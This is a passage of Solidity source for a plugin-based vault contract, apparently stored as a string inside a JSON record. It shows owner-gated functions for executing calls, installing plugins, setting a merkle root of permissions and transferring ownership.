leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function"
    }
  ]
}